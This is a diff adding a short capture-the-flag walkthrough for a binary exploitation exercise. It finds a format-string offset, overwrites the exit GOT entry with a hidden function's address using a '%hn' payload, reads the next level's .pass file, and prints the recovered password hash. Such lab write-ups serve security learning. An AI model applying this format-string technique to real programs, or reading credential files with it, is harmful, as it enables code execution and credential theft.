@@ -1,0 +1,21 @@
+1- find offset
+for((i=0;i<200;i++));do echo "Index $i" && echo "AAAA%$i\$x" | ./level4 ; done | grep -B1 41414141
+Index 4
+AAAA41414141
+
+Offest = 4
+2- o function is never called and it contains the system function
+We notice the presence of exit function at the end of n function, so :
+	- objdump -R level5
+	address of exit function =  0x08049838
+	- we have to modify this address to call o function
+	objdump -d level5
+	address of the o function = 0x080484a4
+	- We have to replace 0x08049838 by 0x080484a4
+	These two address start with 0x0804, we have just to modify the other digits.
+	We have to replace 9838 by 84a4
+	0x84a4 = 33956
+	python -c "print '\x38\x98\x04\x08' + '%33952x' + '%4\$hn'" > /tmp/file
+	cat /tmp/file - | ./level5
+	cat /home/user/level6/.pass
+	d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
